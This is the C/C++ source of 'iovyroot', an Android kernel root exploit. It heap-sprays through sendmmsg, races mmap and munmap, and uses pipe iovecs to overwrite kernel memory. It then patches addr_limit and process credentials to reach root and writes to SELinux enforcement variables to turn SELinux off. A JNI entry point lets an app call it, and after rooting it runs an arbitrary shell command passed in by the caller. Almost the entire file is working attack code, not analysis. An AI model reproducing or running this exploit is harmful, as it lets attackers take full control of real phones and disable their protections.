#define _GNU_SOURCE
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <netinet/ip.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/uio.h>

#include <sys/resource.h>
#include <sys/wait.h>

#include "getroot.h"
#include "time.h"
#include <signal.h>
#include <sys/socket.h>
#include <linux/fcntl.h>
#include <sys/time.h>
#include "threadinfo.h"
#include "sid.h"
#include <string.h>
#include "helpers/IOHelper.h"
#include "ReportManager.h"
#include "DArray.h"
#include "jni.h"
#include "KnownsAddressManager.h"
#include "util/CheckFile.h"

#define UDP_SERVER_PORT (5105)
#define MEMMAGIC (0xDEADBEEF)
//pipe buffers are seperated in pages
#define PIPESZ (4096 * 32)
#define IOVECS (512)
#define SENDTHREADS (128)
#define MMAP_ADDR ((void*)0x40000000)
#define MMAP_SIZE (PAGE_SIZE * 2)

#define PG_SIZE 0x1000
#define MAP_TARGET_ADDR (0x50000000)
#define MAP_TARGET_ADDR2 (0x51000000)
unsigned long *addr = NULL;
unsigned long *addr2 = NULL;
#define TARGET_FUNC_SIZE 16
#define TARGET_FUNC_BEGIN (MAP_TARGET_ADDR + sizeof(unsigned long*) * TARGET_FUNC_SIZE)

#define TIMEOUT 90

static volatile int kill_switch = 0;
static volatile int stop_send = 0;
static int pipefd[2];
static struct iovec iovs[IOVECS];
static volatile unsigned long overflowcheck = MEMMAGIC;

#define EXIT_ROOT_FAILED 128
#define EXIT_ROOT_SUCCESS 96
#define EXIT_ROOT_ARGUMENT_ERROR 80
#define EXIT_ROOT_CHECKFILE_ERROR 82

#define VERSION "1.0.20160708"

static pthread_t msgthreads[SENDTHREADS];

extern "C" {

unsigned long *ksyms_mmap_addr;
unsigned long ksyms_copied;
unsigned long *init_ksyms_map();
void unmap_ksyms();
unsigned long copy_ksyms();
unsigned long get_target_addr(int);
int set_enforce(int value);
int dump_kallsyms(const char *path);
int get_context(char *buf);
int get_enforce();
int modify_task_cred_uc(struct thread_info* info, int sid, unsigned long *cred_addr);
int modify_cred_security_uc(struct cred *cred, int sid);
}
extern unsigned int init_sid;

extern void prepare_syms_for_selinux();
extern void prepare_syms_for_commit_cred();
extern void prepare_syms_for_set_cred();
extern int dump_kernel_text(const char *func, unsigned long size, const char *path);

extern int shutdown_selinux();
int target_offset = 0;

volatile bool is_timeout = false;

unsigned long cred_addr = 0;
struct itimerval new_t, old_t;


#if ! (__LP64__)
struct mmsghdr {
        struct msghdr   msg_hdr;
        unsigned int        msg_len;
};
#define F_SETPIPE_SZ	(1024 + 7)
#endif

static int dummy_callback()
{
    return 0;
}

static void set_callback_func(unsigned long *target)
{
    int i;

    for (i  = 0; i < (PG_SIZE / sizeof (unsigned long*)); i++) {
	if (i < TARGET_FUNC_SIZE)
	    *(addr + i) = (unsigned long)target;
	else
	    *(addr + i) = (unsigned long)addr2;
    }
}

static int init_target_mmap()
{

    addr = (unsigned long *)mmap((void*)MAP_TARGET_ADDR, PG_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
				  MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED) {
	ERROR("创建1级目标映射失败! \n");
	return -1;
    }


    addr2 = (unsigned long *)mmap((void*)MAP_TARGET_ADDR2, PG_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
				  MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr2 == MAP_FAILED) {
	ERROR("创建2级目标映射失败! \n");
	return -1;
    }

    memset(addr2, 0xa0, PG_SIZE);

    set_callback_func((unsigned long*)&dummy_callback);

    TRACE("创建目标映射成功. \n");

    return 0;
}

static int release_target_mmap()
{
    munmap(addr, PG_SIZE);
    munmap(addr2, PG_SIZE);
    return 0;
}

static void* readpipe(void* param)
{
	while(!kill_switch)
	{
		readv((int)((long)param), iovs, ((IOVECS / 2) + 1));
	}

	pthread_exit(NULL);
}

static int startreadpipe()
{
	int ret;
	pthread_t rthread;

	TRACE("执行读管道线程. \n");
	if((ret = pthread_create(&rthread, NULL, readpipe, (void*)(long)pipefd[0])))
		ERROR("创建读管道线程失败. \n");

	return ret;
}

static char wbuf[4096];
static void* writepipe(void* param)
{
	while(!kill_switch)
	{
		write((int)((long)param), wbuf, sizeof(wbuf));
	//	ERROR("写管道失败. \n");
	}

	pthread_exit(NULL);
}

static int startwritepipe(long targetval)
{
	int ret;
	unsigned int i;
	pthread_t wthread;

	TRACE("执行写管道线程. \n");

	for(i = 0; i < (sizeof(wbuf) / sizeof(targetval)); i++)
		((long*)wbuf)[i] = targetval;
	if((ret = pthread_create(&wthread, NULL, writepipe, (void*)(long)pipefd[1])))
		ERROR("创建写管道线程失败. \n");

	return ret;
}

static void* writemsg(void* param)
{
	int sockfd;
	struct mmsghdr msg = {{ 0 }, 0 };
	struct sockaddr_in soaddr = { 0 };

	(void)param; /* UNUSED */
	soaddr.sin_family = AF_INET;
	soaddr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	soaddr.sin_port = htons(UDP_SERVER_PORT);

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd == -1)
	{
		ERROR("套接字客户端创建失败. \n");
		pthread_exit((void*)-1);
	}

	if (connect(sockfd, (struct sockaddr *)&soaddr, sizeof(soaddr)) == -1) 
	{
		ERROR("连接套接字失败. \n");
		pthread_exit((void*)-1);
	}

	msg.msg_hdr.msg_iov = iovs;
	msg.msg_hdr.msg_iovlen = IOVECS;
	msg.msg_hdr.msg_control = iovs;
	msg.msg_hdr.msg_controllen = (IOVECS * sizeof(struct iovec));

	while(!stop_send)
	{
		syscall(__NR_sendmmsg, sockfd, &msg, 1, 0);
	}

	close(sockfd);
	pthread_exit(NULL);
}

static int heapspray(long* target)
{
	unsigned int i;

	TRACE("内存喷射线程数: %d \n", SENDTHREADS);

	iovs[(IOVECS / 2) + 1].iov_base = (void*)&overflowcheck;
	iovs[(IOVECS / 2) + 1].iov_len = sizeof(overflowcheck);
	iovs[(IOVECS / 2) + 2].iov_base = target;
	iovs[(IOVECS / 2) + 2].iov_len = sizeof(*target);

	for(i = 0; i < SENDTHREADS; i++)
	{
		if(pthread_create(&msgthreads[i], NULL, writemsg, NULL))
		{
			ERROR("内存喷射线程执行失败. \n");
			return 1;
		}
	}

	sleep(1024 / SENDTHREADS + 1); // wait for heapspray
	TRACE("内存喷射完成预热. \n");
	return 0;
}

static void* mapunmap(void* param)
{
	(void)param; /* UNUSED */
	while(!kill_switch)
	{
		munmap(MMAP_ADDR, MMAP_SIZE);
		if(mmap(MMAP_ADDR, MMAP_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0) == MAP_FAILED)
		{
			ERROR("映射内存错误. \n");
		}
		usleep(50);
	}

	pthread_exit(NULL);
}

static int startmapunmap()
{
	int ret;
	pthread_t mapthread;

	TRACE("执行映射内存/释放映射内存线程. \n");
	if((ret = pthread_create(&mapthread, NULL, mapunmap, NULL)))
		ERROR("执行映射内存/释放映射内存线程失败. \n");

	return ret;
}

static int initmappings()
{
	memset(iovs, 0, sizeof(iovs));
	TRACE("映射内存. \n");

	if(mmap(MMAP_ADDR, MMAP_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0) == MAP_FAILED)
	{
		ERROR("内存映射错误. \n");
		return -ENOMEM;
	}

	//just any buffer that is always available
	iovs[0].iov_base = &wbuf;
	//how many bytes we can arbitrary write
	iovs[0].iov_len = sizeof(long) * 2;

	iovs[1].iov_base = MMAP_ADDR;
	//we need more than one pipe buf so make a total of 2 pipe bufs (8192 bytes)
	iovs[1].iov_len = ((PAGE_SIZE * 2) - iovs[0].iov_len);

	return 0;
}

static int getpipes()
{
	int ret;
	TRACE("创建管道. \n");
	if((ret = pipe(pipefd)))
	{
		ERROR("创建管道错误. \n");
		return ret;
	}

	ret = (fcntl(pipefd[1], F_SETPIPE_SZ, PIPESZ) == PIPESZ) ? 0 : 1;
	if(ret)
		ERROR("控制管道错误. \n");

	return ret;
}

static int setfdlimit()
{
	struct rlimit rlim;
	int ret;
	if ((ret = getrlimit(RLIMIT_NOFILE, &rlim)))
	{
		ERROR("获取进程最大文件描述符数失败. \n");
	}

	TRACE("进程最大文件描述符数由 %lu 设置为 %lu.\n", rlim.rlim_cur, rlim.rlim_max);
	rlim.rlim_cur = rlim.rlim_max;
	if((ret = setrlimit(RLIMIT_NOFILE, &rlim))) {
		ERROR("设置进程最大文件描述符数失败. \n");
	}
	return 0;
}

static int setprocesspriority()
{
	int ret;
	TRACE("设置进程调度优先级为最高. \n");
	if((ret = setpriority(PRIO_PROCESS, 0, -20)) == -1)
		ERROR("设置进程调度优先级错误. \n");
	return ret;
}

static int write_at_address(void* target, unsigned long targetval)
{
	void* retval;
	unsigned int i;

	kill_switch = 0;
	overflowcheck = MEMMAGIC;

	TRACE("漏洞要写入的目标地址: %p.\n", target);
	if(startmapunmap())
		return 5;
	if(startwritepipe(targetval))
		return 6;
	if(startreadpipe())
		return 7;
	if(heapspray((long*)target))
		return 8;

	while(1)
	{
		if(overflowcheck != MEMMAGIC || is_timeout)
		{
			kill_switch = 1;
			stop_send = 1;
			if (overflowcheck != MEMMAGIC)
				TRACE("喷射成功. \n");
			break;
		}
	}

	for(i = 0; i < SENDTHREADS; i++)
		pthread_join(msgthreads[i], &retval);
	stop_send = 0;

	close(pipefd[0]);
	close(pipefd[1]);
	sleep(1); //let the threads end

	if (is_timeout) {
		is_timeout = false;
		return 1;
	}
	return 0;
}

#if !(__LP64__)
unsigned long place[6];
extern "C" int socket_fd_exploit;
extern "C" int root_by_commit_cred();
extern "C" int root_by_set_cred();
extern "C" struct thread_info *patch_addrlimit();

extern int *selinux_enforce;
extern int *selinux_enabled;
#define WRITE_RETRY_TIMES 1

int getroot(unsigned long target_addr)
{
	int ret = 1;
	int i;
	struct sockaddr_in sock_addr;
	struct thread_info *thread = NULL;
	char context[MAX_CONTEXT];
	int zero = 0;
	struct cred *cred;
	struct task_security_struct *sec, sec_tmp;


	set_callback_func((unsigned long*)patch_addrlimit);

	// try 3 times before failed
	for(i = 0; i < WRITE_RETRY_TIMES; i++) {
//		TRACE("第 %d 次尝试写内核. \n", i + 1);
		ret = write_at_address((void*)target_addr, (unsigned long)addr);
		if (ret == 0) {
			TRACE("写入内核成功！ \n");
			break;
		}
	}

	if (ret)
		goto out;

	//ret = ioctl(socket_fd_exploit, 0xABCD);

	memset(&sock_addr, 0, sizeof(sock_addr));
	sock_addr.sin_family = AF_UNSPEC;/*2*/
	sock_addr.sin_port = 0;
	sock_addr.sin_addr.s_addr = 0;

	TRACE("第一次调用内核回调函数. \n");
	thread = (struct thread_info*)connect(socket_fd_exploit, (struct sockaddr*)&sock_addr, sizeof(sock_addr));

	TRACE("thread_info地址： %p \n", thread);

	if (thread == NULL) {
		ERROR("不能得到thread_info地址. \n");
		ret = 9;
		goto out;
	}

	ret = modify_task_cred_uc(thread, -1, &cred_addr);

	if (ret) {
		ERROR("修改cred失败. \n");
		ret = 13;
		goto out;
	}

	/* are we root ? */
	if (getuid() != 0) {
		/* call commit_cred ? */
		ret = 10;
		goto out;
	}

	TRACE("进程已经获取root权限. \n");

	/* try to shutdown selinux */
	if (set_enforce(0) == 0) {
		TRACE("root权限直接关闭selinux成功! \n");
		ret = 0;
		goto out;
	}

	if (init_ksyms_map() == NULL) {
		ret = 12;
		goto out;
	}
	copy_ksyms();

	//TRACE("拷贝的内核内存大小：0x%lx\n", ksyms_copied);
	prepare_syms_for_selinux();
	prepare_syms_for_set_cred();

	if (selinux_enforce) {
		TRACE("用户态改写 selinux_enforce. \n");
		write_at_address_pipe(selinux_enforce, &zero, sizeof zero);
	}

	if (selinux_enabled) {
		TRACE("用户态改写 selinux_enabled. \n");
		write_at_address_pipe(selinux_enabled, &zero, sizeof zero);
	}

	/* try to shutdown selinux */
	if (set_enforce(0) == 0) {
		TRACE("通过写入关闭selinux成功. \n");
		ret = 0;
		goto out;
	}

	cred = (struct cred*)cred_addr;
	read_at_address_pipe(&cred->security, &sec, sizeof sec);
	read_at_address_pipe(sec, &sec_tmp, sizeof sec_tmp);

	TRACE("进程原始sid = %d, 原始osid = %d \n", sec_tmp.sid, sec_tmp.osid);

	init_sid = get_sid("init");
	if (init_sid) {
	    TRACE("用户态计算获取的init sid = %d \n", init_sid);
	    modify_cred_security_uc((struct cred *)cred_addr, init_sid);
	}

	memset(context, 0, MAX_CONTEXT);
	get_context(context);

	TRACE("当前的上下文： %s \n", context);

	if (strstr(context, "init")){
		ret = 0;
	        goto out;
	}

	/* prepare_syms_for_commit_cred(); */
	/* dump_kallsyms("/data/local/tmp/k_syms"); */
	/* dump_kernel_text("cred_has_capability", 512, "/data/local/tmp/k_dum"); */

	set_callback_func((unsigned long*)&shutdown_selinux);

	memset(&sock_addr, 0, sizeof(sock_addr));
	sock_addr.sin_family = AF_UNSPEC;/*2*/
	sock_addr.sin_port = 0;
	sock_addr.sin_addr.s_addr = 0;

	/* restore original sid */
	modify_cred_security_uc((struct cred *)cred_addr, sec_tmp.sid);

	TRACE("第二次调用内核回调函数. \n");
	connect(socket_fd_exploit, (struct sockaddr*)&sock_addr, sizeof(sock_addr));

	memset(context, 0, MAX_CONTEXT);
	get_context(context);
	TRACE("当前的上下文： %s\n", context);

	if (strstr(context, "init")){
		ret = 0;
	}
	else {
		modify_cred_security_uc((struct cred *)cred_addr, 1);
		ret = 11;
	}

out:
	sleep(1);
	unmap_ksyms();
	sleep(1); // let jobs finished.
	return ret;
}
#else
int getroot(unsigned long target_addr)
{
    return 1;
}
#if 0
int getroot(struct offsets* o)
{
	int ret = 1;
	int dev;
	unsigned long fp;
	struct thread_info* ti;
	void* jopdata;

	if((jopdata = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, -1, 0)) == MAP_FAILED)
		return -ENOMEM;

	printf("[+] Installing JOP\n");
	if(write_at_address(o->check_flags, (unsigned long)o->joploc))
		goto end2;

	// sidtab = o->sidtab;
	// policydb = o->policydb;
	preparejop(jopdata, o->jopret);
	if((dev = open("/dev/ptmx", O_RDWR)) < 0)
		goto end2;

	//we only get the lower 32bit because the return of fcntl is int
	fp = (unsigned)fcntl(dev, F_SETFL, jopdata);
	fp += KERNEL_START;
	ti = get_thread_info(fp);

	printf("[+] Patching addr_limit\n");
	if(write_at_address(&ti->addr_limit, -1))
		goto end;
	printf("[+] Removing JOP\n");
	if(writel_at_address_pipe(o->check_flags, 0))
		goto end;

	if((ret = modify_task_cred_uc(ti)))
		goto end;

	//Z5 has domain auto trans from init to init_shell (restricted) so disable selinux completely
	{
		int zero = 0;
		if(o->selinux_enabled)
			write_at_address_pipe(o->selinux_enabled, &zero, sizeof(zero));
		if(o->selinux_enforcing)
			write_at_address_pipe(o->selinux_enforcing, &zero, sizeof(zero));
	}

	ret = 0;
end:
	close(dev);
end2:
	munmap(jopdata, PAGE_SIZE);
	return ret;
}
#endif
#endif

void timeout(int sig)
{
    if (!kill_switch) {
	INFO("喷射超时. \n");
	is_timeout = true;

	new_t.it_value.tv_sec = TIMEOUT;
	new_t.it_value.tv_usec = 0;
	new_t.it_interval.tv_sec = TIMEOUT;
	new_t.it_interval.tv_usec = 0;
	setitimer(ITIMER_REAL, &new_t, &old_t);
    }
}


static bool ExecuteShellCommand(const char* command) {
	int status = system(command);
	if (status == -1) {
		INFO("命令 %s 执行失败, 系统错误号: %s\n", command, strerror(errno));
	} else {
		if (WIFEXITED(status)) {
			if (WEXITSTATUS(status) == 127 || WEXITSTATUS(status) == 126) {
				INFO("命令未正常执行, 系统错误号: %d, 状态号: %d.\n", errno, WEXITSTATUS(status));
			} else {
				INFO("命令 %s 执行成功\n", command);
				INFO("命令正常执行, 系统错误号: %d.\n", errno);
				INFO("命令正常执行, 返回值: %d.\n", WEXITSTATUS(status));

			}
		} else {
			INFO("命令未正常执行, 系统错误号: %d.\n", errno);
		}
	}
	return true;
}

static void systemExit(int errorCode, int forked) {
	INFO("应用退出,状态号: %d .\n", errorCode);
	if (forked) {
		_exit(errorCode);
	}
	else {
		exit(errorCode);
	}
}


static void detectLogPath(const char *applicationPath, uint32_t solutionId) {
    if (!IOHelper::isFolder(applicationPath)) {
        IOHelper::createFolder(applicationPath, 0777);
    }
    for (int i = 0; i < USHRT_MAX; i++) {
        char path[NAME_MAX] = "\0";
        sprintf(path, "%s/dat%d.%d", applicationPath, solutionId + 100, i);
        if (access(path, F_OK) != 0) {
            strcpy(gLogPath, path);
            break;
        }
    }
}

int main(int argc, char* argv[])
{
	int ret = 1;
	unsigned long target_addr;
	int ch;

	gLogLevel = trace;

	detectLogPath("/data/local/tmp/logdir", 7500);

	while((ch = getopt(argc, argv, "ho:")) != -1) {
		switch (ch) {
		case 'h':
			TRACE("%s 偏移. \n", argv[0]);
			exit(0);
			break;
		case 'o':
			target_offset = atoi(optarg);
			break;
		default:
			break;
		}
	}


	INFO("iovyroot v%s 以 %d 开始.. \n", VERSION, getuid());
	{
		gid_t list[500];
		int x, i;
		x = getgroups(0, list);
		getgroups(x, list);
		for (i = 0; i < x; i++) {
			INFO("iovyroot 所属的组为: %d \n", list[i]);
		}
	}

	int pid;
	int status ;
	for (int i = 0; i < 3; ++i)
	{
		TRACE("第 %d 次尝试执行. \n", i + 1);
		pid = fork();
		if(pid == 0) {

			signal(SIGPIPE, SIG_IGN);

			signal(SIGALRM, timeout);

			new_t.it_value.tv_sec = TIMEOUT;
			new_t.it_value.tv_usec = 0;
			new_t.it_interval.tv_sec = TIMEOUT;
			new_t.it_interval.tv_usec = 0;

			setitimer(ITIMER_REAL, &new_t, &old_t);

			ret = init_target_mmap();
			if (ret < 0) {
				ret = 18;
				goto error_exit;
			}

			target_addr = get_target_addr(target_offset);
			if (target_addr == 0) {
				ret = 15;
				goto error_exit;
			}

			setfdlimit();

			setprocesspriority();

			if(getpipes()) {
				ret = 16;
				goto error_exit;
			}
			if(initmappings()) {
				ret = 17;
				goto error_exit;
			}

			ret = getroot(target_addr);

			if(getuid() == 0)
			{
				INFO("应用执行R成功. \n");

				system("echo abc > root_result");

				systemExit(EXIT_ROOT_SUCCESS);
			}
			else {
			error_exit:
				ERROR("应用执行R失败,返回值: %d\n", ret);

				systemExit(EXIT_ROOT_FAILED);
			}
			release_target_mmap();
		}

		wait(&status);
		ret = WEXITSTATUS(status);
		if (ret == EXIT_ROOT_SUCCESS)
		{
			exit(ret);
		}
	}
	return ret;
}

//Java_com_snake_sofm_Framework_abcd 发布使用的包名
//Java_com_example_kenser_iovyroot_MainActivity_execute 测试使用的包名
 extern "C" JNIEXPORT jint JNICALL Java_com_example_kenser_iovyroot_MainActivity_execute(JNIEnv* env,
		 jclass thiz, jstring logPath, jint solutionId, jstring exePath, jstring exeArgs, jstring addrArgs)
{
	int ret = 1;
	uid_t uid;
	unsigned long target_addr;
	struct itimerval new_t, old_t;
	KnownsAddressManager *pKAManager = NULL;

	const char *shellPath, *shellArgs,*logFilePath;
	char command[512] = "\0";

	gLogLevel = trace;

	shellPath = env->GetStringUTFChars(exePath, NULL);
	shellArgs = env->GetStringUTFChars(exeArgs, NULL);
	logFilePath = env->GetStringUTFChars(logPath, NULL);

	strcpy(gLogPath, logFilePath);
	INFO("solutionId =%d \n", solutionId);
	INFO("logDir =%s \n", logFilePath);
	INFO("shellPath =%s \n", shellPath);
	INFO("shellArg =%s \n", shellArgs);

	if (solutionId != 7500) {
		INFO("传递参数方案号错误, 应用退出. \n");
		return 1;
	}

	if (exePath == NULL) {
		INFO("命令参数:应用参数没有指定, 退出应用程序.\n");
		return 1;
	}

	pKAManager = KnownsAddressManager::instance();
	if (addrArgs != NULL) {
		pKAManager->initialize((char*)env->GetStringUTFChars(addrArgs, NULL));
	}

	sprintf(command, "%s %s", shellPath, shellArgs);
	target_offset = pKAManager->getAddress("offset");
#if 0
	if (strlen(shellPath) == 0 || checkFile(shellPath) == false) {
        TRACE("验证文件 %s 失败.\n", shellPath);
        return EXIT_ROOT_CHECKFILE_ERROR;
    }
#endif
	INFO("iovyroot v%s 以 %d 开始.. \n", VERSION, getuid());
	{
		gid_t list[500];
		int x, i;
		x = getgroups(0, list);
		getgroups(x, list);
		for (i = 0; i < x; i++) {
			INFO("iovyroot 所属的组为: %d \n", list[i]);
		}
	}

	int pid;
	int status;

	for (int i = 0; i < 3; ++i)
	{
		TRACE("第 %d 次尝试执行. \n", i + 1);
		pid = fork();
		if(pid == 0) {

			signal(SIGPIPE, SIG_IGN);

			signal(SIGALRM, timeout);

			new_t.it_value.tv_sec = TIMEOUT;
			new_t.it_value.tv_usec = 0;
			new_t.it_interval.tv_sec = TIMEOUT;
			new_t.it_interval.tv_usec = 0;

			setitimer(ITIMER_REAL, &new_t, &old_t);

			ret = init_target_mmap();
			if (ret < 0) {
				ret = 18;
				goto error_exit;
			}

			target_addr = get_target_addr(target_offset);
			if (target_addr == 0) {
				ret = 15;
				goto error_exit;
			}

			setfdlimit();

			setprocesspriority();

			if(getpipes()) {
				ret = 16;
				goto error_exit;
			}
			if(initmappings()) {
				ret = 17;
				goto error_exit;
			}

			ret = getroot(target_addr);
		 	uid = getuid();
		 	INFO("正在检查结果 ... uid:%d \n", getuid());
			if(uid== 0)
			{
				ReportManager *pRManager = ReportManager::instance();
				pRManager->setAddress((char*)"offset", target_offset);

				pRManager->setShellCode(0);
				if (pRManager->getEnable()) {
					char result[512] = {0};
					pRManager->getResult(result);
					INFO("%s\n", result);
				}
				INFO("****R成功****\n");
				INFO("准备执行: %s \n", command);
				ExecuteShellCommand(command);
				INFO("应用执行R成功. \n");
				systemExit(EXIT_ROOT_SUCCESS);
			}
			else {
				INFO("****R失败****\n");
				INFO("应用执行R失败. \n");
error_exit:
				systemExit(EXIT_ROOT_FAILED);
			}

			release_target_mmap();
		}

		wait(&status);
		ret = WEXITSTATUS(status);

		if (ret == EXIT_ROOT_SUCCESS)
		{
			goto quit;
		}
	}

quit:
	INFO("方案 %d v%s 以 %d %d %d退出.. \n", solutionId,VERSION, getuid(), getpid(), getppid());

	return ret;
}
